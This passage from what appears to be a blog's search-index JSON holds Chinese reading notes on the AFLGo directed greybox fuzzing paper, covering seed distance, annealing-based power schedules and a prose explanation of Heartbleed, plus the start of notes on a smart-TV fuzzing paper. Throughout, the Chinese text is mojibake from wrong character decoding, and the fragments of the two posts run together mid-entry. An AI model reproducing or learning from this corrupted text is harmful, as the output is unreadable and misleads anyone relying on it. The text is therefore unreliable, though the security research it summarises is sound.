·ï¼Œé€šè¿‡å°†åˆ†æè½¬ç§»åˆ°ç¼–è¯‘æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æœ€å°åŒ–è¿è¡Œæ—¶çš„å¼€é”€ã€‚\nä¸åŸºäºç¬¦å·æ‰§è¡Œçš„ç™½ç›’å®šå‘æ¨¡ç³Šæµ‹è¯•çš„åŒºåˆ«ï¼šDGFå°†ç›®æ ‡ä½ç½®çš„å¯è¾¾æ€§ä½œä¸ºä¼˜åŒ–é—®é¢˜ï¼Œè€Œç°æœ‰çš„å®šå‘ï¼ˆç™½ç›’ï¼‰æ¨¡ç³Šæ–¹æ³•å°†å¯è¾¾æ€§ä½œä¸ºè¿­ä»£çº¦æŸæ»¡è¶³é—®é¢˜ã€‚\nä¸»è¦å·¥ä½œï¼šç°ç›’æ¨¡ç³Šå’Œæ¨¡æ‹Ÿé€€ç«çš„æ•´åˆï¼›å¯ä»¥è€ƒè™‘å¤šä¸ªç›®æ ‡ã€åœ¨æ£€æµ‹æ—¶é¢„å…ˆè®¡ç®—ã€å¯ä»¥è¿è¡Œæ—¶å¯¼å‡ºçš„ï¼Œé€‚ç”¨äºç¨‹åºé—´çš„ä¸€ç§æ­£å¼çš„è·ç¦»åº¦é‡æ–¹æ³•ï¼›AFLGOçš„å®ç°æ•´åˆå’Œå®éªŒ\nMOTIVATING EXAMPLE ä»¥å¿ƒè„æ»´è¡€æ¼æ´ä¸ºä¾‹å­ï¼Œç®€å•æ¥è¯´è¯¥æ¼æ´åŸç†å°±æ˜¯æ²¡æœ‰åšè¾¹ç•Œæ£€æµ‹è€Œå¯¼è‡´çš„æ•°æ®æº¢å‡ºã€‚\n2.1 heartbleed and patch testing ç®€å•çš„è¯´ï¼ŒæœåŠ¡å™¨ç«¯å¾—åˆ°æ•°æ®åŒ…ï¼Œæ•°æ®åŒ…é•¿åº¦ä¸ºplen_realï¼Œè€Œæ•°æ®åŒ…ä¸­åŒ…å«ä¸€ä¸ªå­—èŠ‚è¡¨æ˜æœ‰æ•ˆè´Ÿè½½æ•°æ®é•¿åº¦plen_fakeï¼Œæ•°æ®åŒ…å‰©ä¸‹çš„éƒ¨åˆ†æ˜¯æœ‰æ•ˆè´Ÿè½½æ•°æ®ï¼Œé•¿åº¦ä¸ºplen_real-1ã€‚æ•´ä¸ªæ•°æ®åŒ…å­˜å‚¨åœ¨ä¸€ä¸ªcharå‹æ•°ç»„ä¹‹ä¸­ã€‚è€ŒæœåŠ¡å™¨ç«¯æ„é€ æ–°æ•°æ®åŒ…æ—¶ï¼Œå…ˆåˆ†é…ä¸€æ®µplen_fake+1çš„å†…å­˜ç©ºé—´ï¼Œå‰ä¸¤ä¸ªå­—èŠ‚å­˜æ”¾plen_fakeï¼Œä¹‹åä½¿ç”¨memcpyä»æ”¶åˆ°çš„æ•°æ®åŒ…æœ‰æ•ˆè´Ÿè½½æ•°æ®èµ·å§‹ä½ç½®å‘æ–°æ•°æ®åŒ…æ‹·è´plen_fakeå­—èŠ‚æ•°æ®ã€‚æ­£å¸¸æƒ…å†µä¸‹plen_fake = plen_real-1ï¼Œå½“ç”¨æˆ·æœ‰æ„è®¾ç½®plen_fakeå¤§äºå®é™…æœ‰æ•ˆè´Ÿè½½é•¿åº¦plen_real-1æ—¶ï¼ŒæœåŠ¡å™¨å°±ä¼šå‘é€plen_fakeé•¿åº¦çš„æ•°æ®ï¼Œå…¶ä¸­åŒ…æ‹¬plen_fake - plen_real-1é•¿åº¦çš„æ•°æ®ï¼Œè¿™äº›æ•°æ®å¯èƒ½æ˜¯ä¸€äº›ç”¨æˆ·å¯†ç æˆ–è€…å¯†é’¥ã€‚\nä½œè€…å°†AFLGOå’ŒKATCHæ¯”è¾ƒï¼ŒKATCHæ˜¯æœ€å…ˆè¿›çš„åŸºäºç¬¦å·æ‰§è¡Œçš„è‡ªåŠ¨è¡¥ä¸æµ‹è¯•å·¥å…·ã€‚\n2.2Fuzzing the Heartbleed-Introducing Source Code Commit ç®€è¿°KATCHçš„å·¥ä½œåŸç†ï¼šé¦–å…ˆè¯†åˆ«æœ€æ¥è¿‘ç›®æ ‡tçš„åŸºæœ¬å—biï¼Œç„¶åæ„å»ºå¯ä»¥åˆ°è¾¾è¯¥åŸºæœ¬å—çš„è·¯å¾„çº¦æŸï¼Œæ¥ç€è¯†åˆ«å†³å®šä»biåˆ°è¾¾tçš„å­—èŠ‚æ˜¯å“ªä¸ªï¼Œæœ€åæŠŠå®Œæ•´çš„è·¯å¾„çº¦æŸæ”¾åˆ°SMTä¸­æ±‚è§£ã€‚ åŸºäºç¬¦å·æ‰§è¡Œçš„å®šå‘ç™½ç›’æ¨¡ç³Šæµ‹è¯•ç¼ºé™·ï¼šè€—æ—¶ä¹…ï¼Œæ¯æ¢ç´¢ä¸€æ¡è·¯å¾„éƒ½è¦é‡æ–°è®¡ç®—è·ç¦»ï¼›æœç´¢å¯èƒ½ä¸å®Œæ•´ï¼Œè§£é‡Šå™¨å’Œæ±‚è§£å™¨å¯èƒ½ä¸æ”¯æŒè¯­è¨€ç‰¹æ€§æˆ–å­—èŠ‚ç ï¼›è´ªå©ªæœç´¢å¯èƒ½é™·å…¥å±€éƒ¨æœ€ä¼˜ AFLGOä¼˜åŠ¿ï¼šAFLGoæ¯ç§’ç”Ÿæˆå¹¶æ‰§è¡Œæ•°åƒä¸ªè¾“å…¥ï¼Œå¹¶åœ¨ä¸åˆ°20åˆ†é’Ÿçš„æ—¶é—´å†…æš´éœ²Heartbleedï¼›åœ¨è¿è¡Œæ—¶å‡ ä¹ä¸éœ€è¦ç¨‹åºåˆ†æï¼Œåªéœ€è¦åœ¨ç¼–è¯‘/æ’è£…æ—¶è¿›è¡Œè½»é‡çº§ç¨‹åºåˆ†æï¼›å®ç°äº†åŸºäºæ¨¡æ‹Ÿé€€ç«çš„å…¨å±€æœç´¢ï¼›å®ç°äº†å¹¶è¡Œæœç´¢ï¼ŒåŒæ—¶æœç´¢å¤šä¸ªç›®æ ‡ AFLGOæµ‹è¯•å¿ƒè„æ»´è¡€æµç¨‹ é¦–å…ˆå¯¹OPENSSLæ’æ¡©ã€‚å¯¹äºæ’æ¡©åçš„äºŒè¿›åˆ¶ç¨‹åºï¼ŒAFLè´Ÿè´£æ£€æµ‹ä»£ç è¦†ç›–ç‡ï¼ŒAFLGOè´Ÿè´£æ£€æµ‹ç§å­åˆ°ç›®æ ‡çš„è·ç¦» ç„¶åä½¿ç”¨æ¨¡æ‹Ÿé€€ç«å¯¹OPENSSLæ¨¡ç³Šæµ‹è¯•ã€‚ AFLGoè¿›å…¥æ¢ç´¢é˜¶æ®µï¼Œå¹¶åƒAFLä¸€æ ·å·¥ä½œã€‚åœ¨æ¢ç´¢é˜¶æ®µï¼ŒAFLGoéšæœºå˜å¼‚æä¾›çš„ç§å­ï¼Œä»¥äº§ç”Ÿè®¸å¤šæ–°çš„è¾“å…¥ã€‚å¦‚æœä¸€ä¸ªæ–°çš„è¾“å…¥å¢åŠ äº†ä»£ç è¦†ç›–ç‡ï¼Œå®ƒå°†è¢«æ·»åŠ åˆ°è¦æ¨¡ç³ŠåŒ–çš„ç§å­é›†;å¦åˆ™ï¼Œå°†è¢«ä¸¢å¼ƒã€‚æä¾›çš„å’Œç”Ÿæˆçš„ç§å­åœ¨ä¸€ä¸ªè¿ç»­çš„å¾ªç¯ä¸­è¢«æ¨¡ç³ŠåŒ–ã€‚ åœ¨å¼€å‘é˜¶æ®µï¼ŒAFLGoä»ç¦»ç›®æ ‡æ›´è¿‘çš„ç§å­ä¸­äº§ç”Ÿæ›´å¤šçš„æ–°è¾“å…¥ï¼ŒåŸºæœ¬ä¸Šä¸ä¼šæµªè´¹å®è´µçš„æ—¶é—´å»æ¨¡ç³Šå¤ªè¿œçš„ç§å­ã€‚AFLGoæ ¹æ®ä½œä¸ºåŠŸç‡è°ƒåº¦å®ç°çš„é€€ç«å‡½æ•°ï¼Œæ…¢æ…¢åœ°ä»æ¢ç´¢é˜¶æ®µè¿‡æ¸¡åˆ°å¼€å‘é˜¶æ®µã€‚ 3 TRCHNIQUE 3.2Measure of Distance between a Seed Input and Multiple Target Locations ä¸ºå‡½æ•°è°ƒç”¨å›¾å’ŒåŸºæœ¬å—çº§çš„CFGä¸­çš„æ¯ä¸ªèŠ‚ç‚¹åˆ†é…ä¸€ä¸ªå€¼ã€‚\nå°†è·ç¦»ä¸ºf (n,n\u0026rsquo;)çš„å‡½æ•°å®šä¹‰ä¸ºè°ƒç”¨å›¾CGä¸­å‡½æ•°nå’Œn\u0026rsquo;ä¹‹é—´æ²¿æœ€çŸ­è·¯å¾„çš„è¾¹æ•°ã€‚æˆ‘ä»¬å°†å‡½æ•°nä¸ç›®æ ‡å‡½æ•°Tfä¹‹é—´çš„å‡½æ•°çº§ç›®æ ‡è·ç¦»df(n,Tf)å®šä¹‰ä¸ºnä¸ä»»ä½•å¯è¾¾ç›®æ ‡å‡½æ•°tfâˆˆTfä¹‹é—´çš„å‡½æ•°è·ç¦»çš„è°ƒå’Œå¹³å‡å€¼\nmæ˜¯åŸºæœ¬å—ï¼Œnæ˜¯å‡½æ•°\nRï¼ˆn,Tfï¼‰æ˜¯æ‰€æœ‰å¯ä»¥ä»nåˆ°è¾¾çš„ç›®æ ‡å‡½æ•°é›†åˆ\ndb(m1,m2)æ˜¯åŸºæœ¬å—m1å’Œm2ä¹‹é—´æ²¿ç€æœ€çŸ­è·¯å¾„çš„è¾¹æ•°ã€‚\nN(m)æ˜¯åŸºæœ¬å—mè°ƒç”¨çš„å‡½æ•°é›†åˆ\nTæ˜¯å›¾Giä¸­çš„åŸºæœ¬å—çš„é›†åˆ\nGiæ˜¯æ§åˆ¶æµå›¾\nåŸºäºä¸Šé¢çš„å®šä¹‰ï¼ŒåŸºæœ¬å—måˆ°ç›®æ ‡åŸºæœ¬å—Tbçš„è·ç¦»ä¸ºè¿™ä¸ª\nç§å­såˆ°ç›®æ ‡åŸºæœ¬å—Tbçš„è·ç¦»ï¼ˆnormalized seed distanceï¼‰ä¸ºè¿™ä¸ªï¼ˆç§å­çš„è·¯å¾„åŒ…å«çš„åŸºæœ¬å—åˆ°ç›®æ ‡åŸºæœ¬å—çš„å’Œé™¤ä»¥ç§å­è·¯å¾„åŒ…å«åŸºæœ¬å—çš„æ•°é‡ï¼‰ $$d(s,T_{b})=\\frac{\\sum_{m\\in\\xi(s)}d_{b}(m,T_{b})}{|\\xi(s)|} $$\nä½œè€…è¿˜å®šä¹‰äº†normalized seed distance $$\\tilde{d} (s,T_b)$$ï¼Œè¿™æ˜¯ç§å­såˆ°ç›®æ ‡åŸºæœ¬å—Tbçš„è·ç¦»å’Œç§å­åºåˆ—ä¸­ä¸ç›®æ ‡åŸºæœ¬å—Tbçš„æœ€å°è·ç¦»çš„å·®å€¼æ¯”ä¸Šæœ€å¤§è·ç¦»å’Œæœ€å°è·ç¦»çš„å·®å€¼ $$ \\tilde { d } ( s , T _ { b } ) = \\frac { d ( s , T _ { b } ) - \\mathrm { m i n D } } { \\mathrm { m a x } \\mathrm { D - m i nD } } $$\næ³¨æ„ï¼šå‡½æ•°çº§å’ŒåŸºæœ¬å—çº§çš„è·ç¦»è®¡ç®—æ˜¯åœ¨æ’æ¡©çš„æ—¶å€™ï¼Œä¹Ÿå°±æ˜¯fuzzå¼€å§‹ä¹‹å‰é¢„å…ˆè®¡ç®—å¥½çš„ã€‚è€Œä¸Šæ–‡ä¸­çš„mormalized seed distanceæ˜¯åœ¨fuzzä¸­åŸºäºé¢„å…ˆç®—å¥½çš„å‡½æ•°é—´æˆ–åŸºæœ¬å—é—´çš„è·ç¦»è¿›è¡Œè®¡ç®—ï¼Œå› ä¸ºæœ‰é¢„è®¡ç®—çš„å­˜åœ¨ï¼Œæ‰€ä»¥è¿è¡Œä¸­è®¡ç®—å¹¶ä¸ä¼šå¤ªè€—æ—¶\n3.3 Annealing-based Power Schedules ä½œè€…ç»™å‡ºäº†åŸºäºæ¨¡æ‹Ÿé€€ç«ç®—æ³•çš„ç§å­såˆ°ç›®æ ‡åŸºæœ¬å—Tbçš„èƒ½é‡åˆ†é…å…¬å¼ $$ p ( s , T _ { b } ) = ( 1 - \\tilde { d } ( s , T _ { b } ) ) \\cdot ( 1 - T _ { \\mathrm { e x p } } ) + 0 . 5 T _ { \\mathrm { e x p } } $$\nä½œè€…å°†æ¨¡æ‹Ÿé€€ç«ç®—æ³•çš„èƒ½é‡åˆ†é…å’ŒAFLåŸæœ‰çš„èƒ½é‡åˆ†é…ç»“åˆåœ¨ä¸€èµ·ï¼š $$ \\hat { p } ( s , T _ { b } ) = p _ { \\mathrm { a f f } } ( s ) \\cdot 2 ^ { 1 0 \\cdot p ( s , T _ { b } ) - 5 } $$\n3.4 Scalability of Directed Greybox Fuzzing ä½œè€…åœ¨è¿™é‡Œè§£é‡Šäº†AFLGOåœ¨è®¡ç®—èŠ‚ç‚¹é—´çš„ç›®æ ‡è·ç¦»çš„æ—¶å€™æ˜¯å¦‚ä½•æé«˜æ•ˆç‡çš„ã€‚AFLGOä¸å»è®¡ç®—ç¨‹åºé—´æ§åˆ¶æµå›¾ï¼Œå®ƒè®¡ç®—ä¸¤éƒ¨åˆ†å†…å®¹ï¼šè°ƒç”¨å›¾ä¸­çš„å‡½æ•°çº§ç›®æ ‡è·ç¦»å’ŒåŒä¸€ç¨‹åºå†…æ§åˆ¶æµå›¾ä¸­çš„è°ƒç”¨ç‚¹çš„åŸºæœ¬å—çº§åˆ«ç›®æ ‡è·ç¦»ã€‚è®¡ç®—æœ€å°è·ç¦»çš„ç®—æ³•ä½¿ç”¨çš„æ˜¯Djikstraç®—æ³•ï¼Œå¤æ‚åº¦æ˜¯$$O(V^2)$$ï¼ŒVæ˜¯èŠ‚ç‚¹æ•°ã€‚å‡å¦‚è¿™é‡Œæœ‰nä¸ªç¨‹åºå†…æ§åˆ¶æµå›¾ï¼Œå¹³å‡æ¯ä¸ªå›¾æœ‰mä¸ªç»“ç‚¹ï¼ŒAFLGOå…ˆç®—nä¸ªå›¾ä¹‹é—´çš„ç›®æ ‡è·ç¦»ï¼Œå¤æ‚åº¦$$O(n^2)$$ï¼Œç„¶åç®—å›¾å†…çš„æ¯ä¸ªç»“ç‚¹ç›®æ ‡è·ç¦»ï¼Œå¤æ‚åº¦$$O(m^2)$$ï¼Œæ•´ä½“å¤æ‚åº¦$$O(n^2+m^2)$$ã€‚\nç„¶åè¯´äº†ä¸€ä¸‹AFLGOå’ŒAFLå…·æœ‰åŒæ ·çš„å¯æ‹“å±•æ€§ï¼Œå› ä¸ºä¸»è¦çš„ç¨‹åºåˆ†ææ˜¯æ”¾åœ¨ç¼–è¯‘ä¸­ï¼Œè¿è¡Œä¸­å…¶å®æ²¡æœ‰å¤ªå¤§åŒºåˆ«ã€‚\n4 EVALUATION SETUP ç»™å‡ºäº†AFLGOçš„æ¶æ„ï¼Œä½†æ˜¯çœ‹è¿™æ„æ€è¿˜æ˜¯éœ€è¦æºä»£ç å•Šï¼Œä¸æ˜¯ç°ç›’å—ã€‚\n4.1 Implementation AFLGoå›¾æå–å™¨(GE)ç”Ÿæˆè°ƒç”¨å›¾(CG)å’Œç›¸å…³çš„æ§åˆ¶æµå›¾(CFGs)ã€‚CGèŠ‚ç‚¹ç”±å‡½æ•°ç­¾åæ ‡è¯†ï¼ŒCFGèŠ‚ç‚¹ç”±æºæ–‡ä»¶å’Œå¯¹åº”åŸºæœ¬å—çš„ç¬¬ä¸€ä¸ªè¯­å¥è¡Œæ ‡è¯†ã€‚GEå®ç°ä¸ºAFL LLVMé€šé“çš„æ‰©å±•ï¼Œç”±ç¼–è¯‘å™¨AFL -clang-fastæ¿€æ´»ã€‚ç¼–è¯‘å™¨ç¯å¢ƒå˜é‡CCè¢«è®¾ç½®ä¸ºafl-clang-fastï¼Œç„¶åæ„å»ºé¡¹ç›®ã€‚ AFLGoè·ç¦»è®¡ç®—å™¨(DC)é‡‡ç”¨è°ƒç”¨å›¾å’Œæ¯ä¸ªè¿‡ç¨‹å†…æ§åˆ¶æµæ¥è®¡ç®—æ¯ä¸ªåŸºæœ¬å—(BB)çš„è¿‡ç¨‹é—´è·ç¦»ï¼Œå¦‚3.2èŠ‚æ‰€è¿°ã€‚DCè¢«å®ç°ä¸ºä¸€ä¸ªPythonè„šæœ¬ï¼Œå®ƒä½¿ç”¨networkxåŒ…æ¥è§£æå›¾ï¼Œå¹¶æ ¹æ®Djikstraçš„ç®—æ³•è¿›è¡Œæœ€çŸ­è·ç¦»è®¡ç®—ã€‚DCç”ŸæˆBB-distanceæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¯ä¸ªBBçš„åŸºæœ¬å—çº§ç›®æ ‡è·ç¦»ã€‚ AFLGo instrumentorè·å–BB-distanceæ–‡ä»¶ï¼Œå¹¶åœ¨ç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æµ‹é‡æ¯ä¸ªBBã€‚å…·ä½“æ¥è¯´ï¼Œå¯¹äºæ¯ä¸ªBBï¼Œç¡®å®šå„è‡ªçš„BBçº§ç›®æ ‡è·ç¦»ï¼Œå¹¶æ³¨å…¥æ‰©å±•trampolineã€‚trampolineæ˜¯ä¸€æ®µæ±‡ç¼–ä»£ç ï¼Œåœ¨æ¯ä¸ªè·³è·ƒæŒ‡ä»¤ä¹‹åæ‰§è¡Œï¼Œä»¥è·Ÿè¸ªè¦†ç›–çš„æ§åˆ¶æµè¾¹ç¼˜ã€‚ä¸€æ¡è¾¹ç”±64kbå…±äº«å†…å­˜ä¸­çš„ä¸€ä¸ªå­—èŠ‚æ ‡è¯†ã€‚åœ¨64ä½æ¶æ„ä¸Šï¼Œæˆ‘ä»¬çš„æ‰©å±•ä½¿ç”¨16ä¸ªé¢å¤–å­—èŠ‚çš„å…±äº«å†…å­˜:8ä¸ªå­—èŠ‚ç´¯ç§¯è·ç¦»å€¼ï¼Œ8ä¸ªå­—èŠ‚è®°å½•æ‰§è¡Œçš„bbçš„æ•°é‡ã€‚å¯¹äºæ¯ä¸ªBB, aflgo instrumentoræ·»åŠ æ±‡ç¼–ä»£ç i)åŠ è½½å½“å‰ç§¯ç´¯çš„è·ç¦»å¹¶æ·»åŠ å½“å‰BBçš„ç›®æ ‡è·ç¦»ï¼Œii)åŠ è½½å¹¶å¢åŠ æ‰§è¡ŒBBçš„æ•°é‡ï¼Œä»¥åŠiii)å°†ä¸¤ä¸ªå€¼å­˜å‚¨åˆ°å…±äº«å†…å­˜ä¸­ã€‚è¯¥æ£€æµ‹å®ç°ä¸ºAFL LLVMé€šé“çš„æ‰©å±•ã€‚ç¼–è¯‘å™¨è¢«è®¾ç½®ä¸ºafl-clang-fastï¼Œç¼–è¯‘å™¨æ ‡å¿—å¼•ç”¨BB-distanceæ–‡ä»¶ï¼Œé¡¹ç›®æ˜¯ç”¨ASANæ„å»ºçš„ã€‚ AFLGo Fuzzerå®ç°åˆ°AFLç‰ˆæœ¬2.40b(å·²ç»é›†æˆäº†AFLFastçš„æ¢ç´¢è®¡åˆ’[6])ã€‚å®ƒæ ¹æ®æˆ‘ä»¬åŸºäºé€€ç«çš„åŠŸç‡è°ƒåº¦(è§3.3èŠ‚)æ¨¡ç³Šæ£€æµ‹äºŒè¿›åˆ¶ã€‚å…±äº«å†…å­˜ä¸­é¢å¤–çš„16ä¸ªå­—èŠ‚é€šçŸ¥fuzzerå½“å‰çš„ç§å­è·ç¦»ã€‚å½“å‰ç§å­è·ç¦»çš„è®¡ç®—æ–¹æ³•æ˜¯ç”¨ç´¯è®¡bbè·ç¦»é™¤ä»¥æ‰§è¡Œçš„bbæ•°ã€‚ 5 APPLICATION 1: PATCH TESTING ç›¸å¯¹äºKATCHï¼Œæ–°è¦†ç›–çš„åŸºæœ¬å—æé«˜äº†13%ï¼Œä½œè€…è®¤ä¸ºæ²¡æœ‰è¦†ç›–åˆ°çš„BBæ˜¯å› ä¸ºç‰¹å®šçš„æ“ä½œç³»ç»Ÿã€å¯„å­˜å™¨é—´æ¥è°ƒç”¨ç­‰ä¸ä½œä¸ºè¾¹å‡ºç°åœ¨CFGä¸­ç­‰åŸå› ã€‚ åŒæ—¶ï¼ŒKATCHå’ŒAFLGOå„è‡ªéƒ½æœ‰å½¼æ­¤æ²¡æœ‰å‘ç°çš„åŸºæœ¬å—ã€‚ä½œè€…è®¤ä¸ºå¯ä»¥å°†æœ‰å‘ç™½ç›’å’Œæœ‰å‘ç°ç›’æ•´åˆ 6 APPLICATION 2: CONTINUOUS FUZZING æ–°ç©æ„å„¿ directed symbolic-execution-based whitebox fuzzing åŸºäºç¬¦å·æ‰§è¡Œçš„å®šå‘ç™½ç›’æµ‹è¯• SMTæ˜¯å•¥å­ Driller[38]æ˜¯ä¸€ä¸ªï¼ˆæ— å®šå‘ï¼‰æ¨¡ç³Šå™¨çš„ä¾‹å­ï¼Œå®ƒé›†æˆäº†AFLç°ç›’æ¨¡ç³Šå™¨å’ŒKleeç™½ç›’æ¨¡ç³Šå™¨ã€‚ ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/aflgo-directed-greybox-fuzzing/","summary":"#å®šå‘fuzzing ABSTRACT èƒŒæ™¯ï¼ˆé—®é¢˜ï¼‰ï¼šç°æœ‰ç°ç›’fuzzerä¸èƒ½è¿›è¡Œæœ‰æ•ˆçš„å®šå‘fuzz æ–¹æ³•ï¼šåŸºäºæ¨¡æ‹Ÿé€€ç«çš„power scheduleï¼Œå¯ä»¥å°†æ›´å¤š","title":"AFLGO Directed Greybox Fuzzing"},{"content":"ä¸­æ–‡è¯‘åï¼šé€šè¿‡æ—¥å¿—å¼•å¯¼çš„å®‰å“æ™ºæ…§ç”µè§†æ¼æ´æ¨¡ç³Šæµ‹è¯• ä½œè€…ï¼šYousra Aafer å•ä½ï¼šæ»‘é“å¢å¤§å­¦ å›½å®¶ï¼š #æ³•å›½ å¹´ä»½ï¼š #2021å¹´ æ¥æºï¼š #USENIXä¼šè®® å…³é”®å­—ï¼š #fuzzing ä»£ç åœ°å€ï¼š ç¬”è®°å»ºç«‹æ—¶é—´ï¼š 2023-04-22 14:16\nabstract å¼€å‘äº†ä¸€ç§æ–°çš„åŠ¨æ€æ¨¡ç³Šæ–¹æ³•ï¼Œå…¶ç‰¹ç‚¹æ˜¯åŸºäºæ—¥å¿—çš„åŠ¨æ€è¾“å…¥è§„èŒƒæ¨å¯¼å’Œåé¦ˆæ”¶é›†ã€‚æˆ‘ä»¬çš„è§£å†³æ–¹æ¡ˆè¿›ä¸€æ­¥å¼•å…¥äº†ä¸€ç§æ–°çš„å¤–éƒ¨è§‚å¯Ÿè€…ï¼Œå®ƒå¯ä»¥ç›‘æµ‹ä¸ç”µè§†ç›¸å…³çš„ç‰©ç†ç—‡çŠ¶ (å³è§†è§‰å’Œå¬è§‰)ï¼Œä»¥æ£€æµ‹æ½œåœ¨çš„èº«ä½“å¼‚å¸¸ã€‚\nintroduction é™æ€åˆ†æå‘ç°â€œæœ‰è¶£â€çš„å®šå€¼ç›®æ ‡ï¼Œä½œè€…ä¸“æ³¨äºä¾›åº”å•†é›†æˆåˆ°æ“ä½œç³»ç»Ÿä¸­çš„ API åŠ¨æ€åˆ†ææ›¹å‹‡å³æ—¶æ—¥å¿—åˆ†ææŠ€æœ¯ï¼Œæ¨æ–­ç›®æ ‡ API çš„è¾“å…¥è§„èŒƒå¹¶æ”¶é›†æ‰§è¡Œåé¦ˆã€‚ background æ“ä½œç³»ç»Ÿå®šåˆ¶åŒ– API å¤š æ“ä½œè®¾å¤‡ç‰©ç†çŠ¶æ€çš„ API è¿è¡Œåœ¨é«˜æƒé™ç¯å¢ƒä¸­ å¤§å¤šæ•° API ç¼ºä¹ä¿æŠ¤æœºåˆ¶ æŒ‘æˆ˜ é€†å‘åˆ†æç›®æ ‡æ¥å£ å¯¹è¾“å…¥æ ‡å‡†çš„é€†å‘ å¯¹æœ¬åœ°å±‚çš„ API æè¿°ç¬¦çš„é€†å‘ è¯„ä¼°æ‰§è¡Œåé¦ˆâ€”â€”ä¸»è¦æ˜¯ç¨‹åºè‚¯èƒ½ä¸ä¼šå´©æºƒï¼Œä½†æ˜¯è®¾å¤‡çš„ç‰©ç†ååº”ä¼šå­˜åœ¨å¼‚å¸¸ 0 Design Overview 4 Fuzzing Target Locator ç›®çš„ï¼šæå–ç¨‹åºä¸­çš„å®šåˆ¶æœåŠ¡ æ–¹æ³•ï¼šå°†æå–çš„ api å’Œ AOSP æ¨¡å‹çš„ API æ¯”è¾ƒï¼ŒAOSP ä¸­æ²¡æœ‰çš„å°±æ˜¯å®šåˆ¶ api æ£€æµ‹ç³»ç»ŸæœåŠ¡ API java å±‚ api å¯ä»¥ä»ç›¸åº”æœåŠ¡ IBinder æ¥å£çš„å­—èŠ‚ç ä¸­æå– æœ¬æœºå±‚ api æ±‚åŠ©äºåœ¨åº•å±‚ Binder IPC ä¸­æå–æœ¬åœ°å‡½æ•°çš„æ¥å£ ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹äºæ¯ä¸ªæœ¬æœº APIï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯ä»æœ¬æœºäºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ¢å¤äº‹åŠ¡ idã€å‚æ•°ã€å›å¤æ•°æ®ç±»å‹ æå–æœ¬åœ°å‡½æ•°æ¥å£ å¯¹è¿™éƒ¨åˆ†ä¸æ„Ÿå…´è¶£ï¼Œè·³è¿‡ã€‚\n5 Input Generation Through Log-Guidance è¿‡æ»¤ä¸ç›®æ ‡ API æ— å…³çš„æ—¥å¿—ä¿¡æ¯ è¿‡æ»¤ä¸è¾“å…¥éªŒè¯æ— å…³çš„æ—¥å¿—ä¿¡æ¯ æå–è¾“å…¥è§„èŒƒ è¯†åˆ«ç›®æ ‡ api ç›¸å…³æ—¥å¿—ä¿¡æ¯ é‡‡ç”¨ç»Ÿè®¡æ–¹æ³•ï¼Œå› ä¸ºç›®æ ‡ API è®°å½•çš„æ¶ˆæ¯åº”è¯¥åŒ…å«åœ¨æ‰§è¡Œåè·å¾—çš„æ‰€æœ‰æ—¥å¿—è½¬å‚¨ä¸­ï¼Œæ‰€ä»¥é€šè¿‡åœ¨è°ƒç”¨ç›®æ ‡ API ä¹‹å‰å’Œä¹‹åè·å¾—çš„æ—¥å¿—è½¬å‚¨ä¹‹é—´æ‰§è¡Œä¸€ç»„å·®å¼‚æ¥è·å¾—ç›®æ ‡æ¶ˆæ¯ã€‚ ä½†æ˜¯è¿™æ ·å¹¶ä¸è¶³ä»¥å»æ‰æ‰€æœ‰çš„éç›®æ ‡ä¿¡æ¯ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬ä¾é ç»™å®šæ¶ˆæ¯åœ¨ä¸€ç»„ç›®æ ‡æ—¥å¿—å’Œå¦ä¸€ç»„åŸºçº¿æ—¥å¿—ä¸Šçš„ç»éªŒæ¦‚ç‡æ¥ä¼°è®¡å®ƒæˆä¸ºç›®æ ‡æ¶ˆæ¯çš„å¯èƒ½æ€§ã€‚ç›´è§‚åœ°è¯´ï¼Œåœ¨ç›®æ ‡æ—¥å¿—ä¸­å…·æœ‰è¾ƒé«˜ç»éªŒæ¦‚ç‡çš„æ¶ˆæ¯å’Œåœ¨åŸºçº¿æ—¥å¿—ä¸­å…·æœ‰è¾ƒä½ç»éªŒæ¦‚ç‡çš„æ¶ˆæ¯è¡¨æ˜å®ƒå¯èƒ½æ˜¯ç›®æ ‡æ¶ˆæ¯ã€‚ è¯†åˆ«è¾“å…¥éªŒè¯ä¿¡æ¯ é€šè¿‡å­—ç¬¦ä¸²åˆ†æé‡å»ºå¤§é‡çš„æ—¥å¿—æ¶ˆæ¯æ¨¡æ¿ï¼Œåˆ©ç”¨æ±¡ç‚¹åˆ†ææ ‡è®°æ˜¯å¦å’Œè¾“å…¥éªŒè¯æœ‰å…³ã€‚ç”¨è¿™äº›æ•°æ®æ¥è®­ç»ƒä¸€ä¸ªåˆ†ç±»å™¨ã€‚ ç»„ä»¶ (A)æ”¶é›†å¹¶è‡ªåŠ¨æ ‡è®°æ¥è‡ªå„ç§ Android æ¡†æ¶çš„è®­ç»ƒæ ·æœ¬ (çº¦57000æ¡æ¶ˆæ¯)ã€‚ç»„ä»¶ (B)ä½¿ç”¨è®­ç»ƒè¯­æ–™åº“æ¥è®­ç»ƒä¸åŒçš„åˆ†ç±»å™¨: æˆ‘ä»¬åˆ©ç”¨ word2vecï¼Œè¿™æ˜¯æœ€å…ˆè¿›çš„é¢„æµ‹æ¨¡å‹ï¼Œç”¨äºå­¦ä¹ åŸå§‹æ–‡æœ¬ä¸­çš„è¯åµŒå…¥ï¼Œä¸ºæ¯ä¸ªæ¶ˆæ¯æ„å»ºç‰¹å¾å‘é‡ã€‚ç„¶åæˆ‘ä»¬ç”¨ç‰¹å¾å‘é‡ä½œä¸º CNN çš„ç¬¬ä¸€å±‚æ¥è®­ç»ƒ CNN åˆ†ç±»å™¨ã€‚ åŠ¨æ€ fuzzer ï¼Ÿä½œè€…åªæ˜¯ç”¨ä¸€ä¸ªä¾‹å­å±•ç¤ºäº†æ•ˆæœï¼Œä½†æ˜¯è¿™é‡Œ fuzzer å¦‚ä½•ä¾æ® log å»å˜å¼‚çš„ï¼Ÿä½œè€…è²Œä¼¼æ²¡æœ‰æåˆ°\nå¾ˆå¯æƒœã€‚è¿™ç¯‡è®ºæ–‡æ²¡æœ‰å¼€æºä»£ç 